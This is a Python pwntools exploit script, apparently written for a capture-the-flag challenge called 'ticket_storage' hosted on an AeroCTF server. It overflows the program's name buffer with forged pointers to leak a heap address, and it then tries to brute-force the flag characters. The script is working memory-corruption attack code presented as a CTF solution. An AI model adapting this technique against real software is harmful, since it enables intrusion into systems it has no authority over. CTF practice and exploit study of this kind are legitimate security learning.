from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './ticket_storage'
HOST = 'tasks.aeroctf.com'
PORT = 33014

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()
if args.D:
    debug(r, [0x182a])

def reserve(dep, dest, cost=0):
    r.sendlineafter('> ', '1')
    r.sendlineafter('city: ', dep)
    r.sendlineafter('city: ', dest)
    r.sendlineafter('cost: ', str(cost))
    r.recvuntil('id: ')
    idx = r.recvuntil('\n')[:-1]
    return idx

def view(idx):
    r.sendlineafter('> ', '2')
    r.sendafter('id: ', idx)

def view_list():
    r.sendlineafter('> ', '3')

def delete(idx):
    r.sendlineafter('> ', '4')
    r.sendlineafter('id: ', idx)

def change(name):
    r.sendlineafter('> ', '5')
    r.sendlineafter('name: ', name)

r.sendafter('name: ', 'A'*0x88)


v0 = reserve('C', 'B')
v1 = reserve('C', 'B')
v2 = reserve('C', 'B')
v3 = reserve('C', 'B')
v4 = reserve('C', 'B')
v5 = reserve('C', 'B')
# view_list()
v6 = reserve('C', 'B')
# v7 = reserve('CCCC', 'BBBB')
import string
bag = string.ascii_lowercase + '0123456789'
delete(v0)
delete(v1)
payload = '' 
payload += flat(0x4041b0, 0x4041b8, 0, 0x4041c0, 0, 0)
payload = payload.ljust(0x80, '\x00')
payload += p64(0x404120)
change(payload) 
view('\x00'*9)
r.recvuntil('From: ')
leak = u64(r.recvuntil('\n')[:-1].ljust(8, '\x00'))
dbg("leak")
heap = leak - 0xee0
target1 = heap + 0x560
target2 = heap + 0x5f0
target3 = heap + 0x4b4

payload = '' 
payload += flat(target1, target2, 0, target3, 0, 0)
payload = payload.ljust(0x80, '\x00')
payload += p64(0x404120)
change(payload) 
view('\x00'*9)

r.interactive()
for i in bag:
    for j in bag:
        for k in bag:
            log.info(i+j+k)
            view('Aero{'+i+j+k)
            text = r.recvuntil('1. ')
            if 'not' in text: 
                continue
            break
        if 'not' in text: 
            continue
        break

    if 'not' in text: 
        continue
    break
# delete(v1)

r.interactive()
r.close()
